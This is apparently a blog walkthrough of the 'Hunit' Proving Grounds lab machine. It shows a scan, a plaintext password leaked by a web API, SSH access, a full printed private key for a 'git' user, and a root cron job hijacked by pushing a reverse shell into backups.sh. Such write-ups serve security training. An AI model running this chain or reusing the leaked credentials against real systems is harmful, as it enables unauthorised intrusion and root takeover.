---
layout: post
title: PG | Hunit
subtitle: Hunit - the goddess of the 26th day of the month.
thumbnail-img: /assets/img/OffSec.png
---

# Nmap Scan Results

~~~shell
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-25 11:38 UTC
Nmap scan report for 192.168.191.125
Host is up (0.014s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
8080/tcp  open  http-proxy
|_http-title: My Haikus
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Content-Length: 3762
|     Date: Wed, 25 Oct 2023 11:41:40 GMT
|     Connection: close
|     <!DOCTYPE HTML>
|     <!--
|     Minimaxing by HTML5 UP
|     html5up.net | @ajlkn
|     Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
|     <html>
|     <head>
|     <title>My Haikus</title>
|     <meta charset="utf-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
|     <link rel="stylesheet" href="/css/main.css" />
|     </head>
|     <body>
|     <div id="page-wrapper">
|     <!-- Header -->
|     <div id="header-wrapper">
|     <div class="container">
|     <div class="row">
|     <div class="col-12">
|     <header id="header">
|     <h1><a href="/" id="logo">My Haikus</a></h1>
|     </header>
|     </div>
|     </div>
|     </div>
|     </div>
|     <div id="main">
|     <div clas
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Wed, 25 Oct 2023 11:41:40 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 505 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Wed, 25 Oct 2023 11:41:40 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505 
|_    HTTP Version Not Supported</h1></body></html>
12445/tcp open  netbios-ssn Samba smbd 4.6.2
18030/tcp open  http        Apache httpd 2.4.46 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Whack A Mole!
|_http-server-header: Apache/2.4.46 (Unix)
43022/tcp open  ssh         OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 7b:fc:37:b4:da:6e:c5:8e:a9:8b:b7:80:f5:cd:09:cb (RSA)
|   256 89:cd:ea:47:25:d9:8f:f8:94:c3:d6:5c:d4:05:ba:d0 (ECDSA)
|_  256 c0:7c:6f:47:7e:94:cc:8b:f8:3d:a0:a6:1f:a9:27:11 (ED25519)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 231.48 seconds
~~~

# Service Enumeration

## HTTP (TCP/8080)

![Hunit](/assets/img/HunitPG(1).png)

I started by running a Gobuster sub-directory scan in the background and navigating the sourcecode of each webpage and found a HTML comment referring to a /api sub-directory view-source:http://192.168.191.125:8080/article/the-taste-of-rain

![Hunit](/assets/img/HunitPG(2).png)

Upon navigating to the /api directory http://192.168.168.191.125:8080/api a public facing JSON api is displayed showing other sub-directories including articles (which we have already seen) and a /user sub-directory.

![Hunit](/assets/img/HunitPG(3).png)

Navigating deeper into http://192.168.191.125:8080/api/user/ we are presented with a list of user credentials as shown below

![Hunit](/assets/img/HunitPG(4).png)

The dademola account has "Admin" in its description, so we will attempt to authenticate with those credentials via SSH on port 43022 first (dademola:ExplainSlowQuest110)

# Exploitation
~~~shell
┌──(kali㉿kali)-[~/Desktop/Hunit]
└─$ ssh dademola@192.168.191.125 -p 43022             
The authenticity of host '[192.168.191.125]:43022 ([192.168.191.125]:43022)' can't be established.
ED25519 key fingerprint is SHA256:rNaauuAfZyAq+Dhu+VTKM8BGGiU6QTQDleMX0uANTV4.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:25: [hashed name]
    ~/.ssh/known_hosts:27: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.191.125]:43022' (ED25519) to the list of known hosts.
dademola@192.168.191.125's password: 
[dademola@hunit ~]$ whoami
dademola
~~~

And now we have our initial foothold!

# Privilege Escalation
I started the privilege escalation by running a linpeas.sh scan and identified two cronjob scheduled files running as root every 2 and 3 minutes named 'git-server/backups.sh' and 'pull.sh'
~~~shell
/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Nov  6  2020 .
drwxr-xr-x 6 root root 4096 Nov  6  2020 ..
-rw------- 1 root root    9 Feb 16  2023 cron.daily
-rw------- 1 root root    9 Feb 16  2023 cron.monthly
-rw------- 1 root root    9 Feb 16  2023 cron.weekly
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
~~~

There was also a SSH private key (as shown below) to another user account named 'git' which we can assume is running the git-server, so we can pivot to that user to see if the user has permissions to edit either 'pull.sh' or 'backups.sh' cronjobs to contain a reverse shell so when they are executed every 2 or 3 minutes by root the reverse shell will be executed with root privileges

![Hunit](/assets/img/HunitPG(5).png)

~~~shell
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                                  
                                                                                                                                                                             
-rwxr-xr-x 1 root root 2590 Nov  5  2020 /home/git/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAtvi+/zIFPzCfn2CBFxGtflgPf6jLxY9ZFEwZNHbQjg32p3cWbzQG
wRWNSVlBYzj6sXPjcWTRc7p08WHb9/85L0/f94lfXUIB9ptipL9EHxSUDxGroP60H9jJTj
0Kuety1G+xSyti++Qji6hxmuRrQ4e5Q6lBn84/CXAnRH6GLYFRywJEXQtLHCwtlhVEqP7H
ZAWLtDFnWQV7eMF9RCNBVSWBbeQITbZDSbctg5P0H35ioPu67Pygo9SfSRXpBPVBI13feB
II2V3iL+BQy6seCj7tHj9pNYZFWjroKVCBZkoLfLsTHRkXDKLRICvcHw1yOWUf4sFNnXkc
lHCxsEU6dJD9k7hwnK1Es+QglXQSS0JOmPwTfpRkrX1d27K31roQP/YGVbZJEi3stAmaZ3
iQ1cQMy2NQ6ESoupNdQeVFy0E4cpp/NDyazh/vt2irc6fUN+jdFvCWZbIO6pml+HWOU3U3
AxFTSXmbrjMHahArxMq/JtUwJauyw09FKtycEO3zAAAFgJYa8VCWGvFQAAAAB3NzaC1yc2
EAAAGBALb4vv8yBT8wn59ggRcRrX5YD3+oy8WPWRRMGTR20I4N9qd3Fm80BsEVjUlZQWM4
+rFz43Fk0XO6dPFh2/f/OS9P3/eJX11CAfabYqS/RB8UlA8Rq6D+tB/YyU49CrnrctRvsU
srYvvkI4uocZrka0OHuUOpQZ/OPwlwJ0R+hi2BUcsCRF0LSxwsLZYVRKj+x2QFi7QxZ1kF
e3jBfUQjQVUlgW3kCE22Q0m3LYOT9B9+YqD7uuz8oKPUn0kV6QT1QSNd33gSCNld4i/gUM
urHgo+7R4/aTWGRVo66ClQgWZKC3y7Ex0ZFwyi0SAr3B8NcjllH+LBTZ15HJRwsbBFOnSQ
/ZO4cJytRLPkIJV0EktCTpj8E36UZK19Xduyt9a6ED/2BlW2SRIt7LQJmmd4kNXEDMtjUO
hEqLqTXUHlRctBOHKafzQ8ms4f77doq3On1Dfo3RbwlmWyDuqZpfh1jlN1NwMRU0l5m64z
B2oQK8TKvybVMCWrssNPRSrcnBDt8wAAAAMBAAEAAAGAL2RonFMJdt+SSMbHSQFkLbiDcy
52cVp62T4IvUUVKeZGAARhhDY2laaObPQ4concrT/2JnXVpqMiDS+quSabWjzXJxem4tHp
DkYbG88Kxv4eh3StPssaPrF5GtHGyHdKy+mOQ4keX14tMsxTeKo3ektaWkMp40mZnEk3co
9PE9ROKkYRDQSS1N5AhIJHwXoUjTy+fdLaEP3RiGqdlpuHHZXUW3FYEUDnVt2iZVVaQxoK
U+Y/+YhJ14WIKHcLXyRi5YG5YGwsVQl3M0Ji+spIs5p6Xr2+Jwak9Zd6laBJt4Dt2/tt9C
eF0ohAr89b4Kkg2tLQ8yphogyP/yZJiOElOcjf3e2CRWrjEVwXmt98EXHUlkf0cj7gcZBa
Ao5Pp/gxGX3wgVSguE1oTTcDa1Cnxu2fpLF1BscVQ3IuugnzMBljKkS0sGHGny1ujSNGE9
L3/jbS0DQBQHwz37S6M2C3W2A4tqmbUcX4xdUHG8kXn1LvybJpbGsTT7eZ3l/NDgBRAAAA
wQCMOvhEi8kvk4uNYJhHSCDdDZ4Hpso0/wQXbJu1SX2ZKkSc0DGJ4MiK5QftbG5g/OQs7g
lV9oteMuOly+WpFWbQYiAhKac7WcFdzJrR3qPALF8Ki5qyZnthibVZ5H98ndbdPCYLu+Le
jJ9w0usWvK2QF/CjGAALuL4ryAPNGCXRx1a2N6AKvfnm/8xb+4cY/3HMpJCGOqwcvQEk+t
PW3F9DqQgp02tkchiljjGI7NEJiYjwfR4spIPK6/DUy4HzkPAAAADBAOYN7bVwgbxc73Xr
NA9r4aSyqvVAQncSXy3sfUimnVKnoNprNlD0GI65YBO3WOQ1tq3MBDloAX9ZD1LDBRp7NL
ZfExqUxBBtTqOdvo8BLNPOvHGdTEGycu74+yPb+CnjqymkrcA7J81rcNM2CjnL9MBFM9R+
DkWUnDMsGg/3JDpNBKhT1kxEHr5UXcX7Ho8bkf0+qUBNagx0j9GuYg74NqaQ1LlBTMR4Ty
jn4T932jkf8EGo/oPhuN86FsOv3hlEeQAAAMEAy5t06uOSOY4aTZd0o8v249k7dfvGWYTG
ZNLEBRIzd1r47LPCkBHXckDNcvHmmSjBSrl9iZkrHSwSFjnL5+UbOCdN3CfRe3o2NuUcaW
yQL0KeFMhCR9tQOFRYDqfEqahd2mKg/7HIYdlaSJBaSf7I4X17SqOKoO/H15E3GMPPdupZ
tX8QOYlpuVHmka5pFsgxgGb0tX36BBIp0M7Dew19niY2DrhsiWte1PwM1Udbibp5xLr6nn
qMb6iia+pJ6DLLAAAACnJvb3RAaHVuaXQ=
-----END OPENSSH PRIVATE KEY-----
-rwxr-xr-x 1 root root 564 Nov  5  2020 /home/git/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2+L7/MgU/MJ+fYIEXEa1+WA9/qMvFj1kUTBk0dtCODfandxZvNAbBFY1JWUFjOPqxc+NxZNFzunTxYdv3/zkvT9/3iV9dQgH2m2Kkv0QfFJQPEaug/rQf2MlOPQq563LUb7FLK2L75COLqHGa5GtDh7lDqUGfzj8JcCdEfoYtgVHLAkRdC0scLC2WFUSo/sdkBYu0MWdZBXt4wX1EI0FVJYFt5AhNtkNJty2Dk/QffmKg+7rs/KCj1J9JFekE9UEjXd94EgjZXeIv4FDLqx4KPu0eP2k1hkVaOugpUIFmSgt8uxMdGRcMotEgK9wfDXI5ZR/iwU2deRyUcLGwRTp0kP2TuHCcrUSz5CCVdBJLQk6Y/BN+lGStfV3bsrfWuhA/9gZVtkkSLey0CZpneJDVxAzLY1DoRKi6k11B5UXLQThymn80PJrOH++3aKtzp9Q36N0W8JZlsg7qmaX4dY5TdTcDEVNJeZuuMwdqECvEyr8m1TAlq7LDT0Uq3JwQ7fM= root@hunit
~~~

Save the private key locally (from /home/git directory) and apply the correct file permissions for the private key (600 / -rw-------)
~~~shell
┌──(kali㉿kali)-[~/Desktop/Hunit]
└─$ scp -P 43022 dademola@192.168.191.125:/home/git/.ssh/id_rsa .
dademola@192.168.191.125's password: 
id_rsa                                                                                                                                     100% 2590    86.8KB/s   00:00    
┌──(kali㉿kali)-[~/Desktop/Hunit]
└─$ chmod 600 id_rsa 
~~~

We can then SSH into the git account where we recieve a git shell
~~~shell
┌──(kali㉿kali)-[~/Desktop/Hunit]
└─$ ssh -i id_rsa -p 43022 git@192.168.191.125
git> 
~~~

To perform privilege escalation as discussed in this [post](https://www.hackingarticles.in/linux-for-pentester-git-privilege-escalation/) we can  clone the git repository locally, manipulate backups.sh to contain our reverse shell then push the changes to the master so when the master branch (target machine) runs our malicious backups.sh it will execute the reverse shell and grant us a root shell

I attempted to clone the repository using git, however the SSH connection is running on port 43022 not port 22 and we need to use a Private Key to connect so it did not work
~~~shell
┌──(kali㉿kali)-[~/Desktop/Hunit]
└─$ git clone git@192.168.191.125:/git-server
Cloning into 'git-server'...
^C
~~~

After researching a [workaround](https://stackoverflow.com/questions/4565700/how-to-specify-the-private-ssh-key-to-use-when-executing-shell-command-on-git/29754018#29754018) I found the command GIT_SSH_COMMAND='ssh -i private_key_file -o IdentitiesOnly=yes' git clone user@host:repo.git
~~~shell
┌──(kali㉿kali)-[~/Desktop/Hunit]
└─$ GIT_SSH_COMMAND='ssh -i id_rsa -p 43022 -o IdentitiesOnly=yes' git clone git@192.168.191.125:/git-server
Cloning into 'git-server'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.
~~~

Create a git account locally
~~~shell
┌──(kali㉿kali)-[~/Desktop/Hunit]
└─$ git config --global user.name "Jay"
┌──(kali㉿kali)-[~/Desktop/Hunit]
└─$ git config --global user.email j@j.com
~~~

Append backups.sh to include a reverse shell and make backups.sh executable

![Hunit](/assets/img/HunitPG(6).png)

~~~shell
┌──(kali㉿kali)-[~/Desktop/Hunit]
└─$ chmod +x id_rsa   
~~~

Create a listener on port 8080
~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8080
listening on [any] 8080 ...
~~~

Commit our changes
~~~shell
┌──(kali㉿kali)-[~/Desktop/Hunit/git-server]
└─$ git add -A
                                                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop/Hunit/git-server]
└─$ git commit -m 'first commit'
[master 9094c16] first commit
 1 file changed, 1 insertion(+)
 mode change 100644 => 100755 backups.sh
~~~
Push the changes to master (target machine)
~~~shell
┌──(kali㉿kali)-[~/Desktop/Hunit/git-server]
└─$ GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git push origin master
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 373 bytes | 373.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
To 192.168.191.125:/git-server
   b50f4e5..9094c16  master -> master
~~~

And after a while we recieve a root shell on our netcat listeners
~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8080
listening on [any] 8080 ...
connect to [192.168.45.173] from (UNKNOWN) [192.168.191.125] 51138
sh: cannot set terminal process group (16451): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.0# whoami
whoami
root
sh-5.0# 
~~~